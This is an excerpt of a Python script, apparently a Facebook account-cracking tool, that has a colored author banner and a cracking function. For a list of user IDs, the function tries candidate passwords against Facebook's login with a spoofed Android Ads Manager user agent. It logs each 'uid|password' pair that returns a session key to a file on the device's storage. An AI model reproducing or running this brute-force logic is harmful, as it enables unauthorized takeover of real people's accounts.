...
\033[1;99m==============================================================================
\033[1;32m[✓]AUTHOR  :\033[1;32m Asraf mahadi
\033[1;32m[✓]TOOL    :\033[1;32m NEW 
\033[1;32m[✓]FACEBOOK:\033[1;32m ALEX ADOR
...
def main():
    logox()
    sujoy(".WELLCOME to.Sriejoy.tools","I.mp3")
...
def file_subb(uid,pwx):
    ...
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; CPH1879 Build/LRX22C) [FBAN/PAAA;FBAV/66.0.0.10.89;FBPN/com.facebook.adsmanager;FBLC/sv_SE;FBBV/393687661;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/CPH1879;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=915,height=1763};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            ...
            if "session_key" in q:
                ...
                open("/sdcard/SRIEJOY.Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
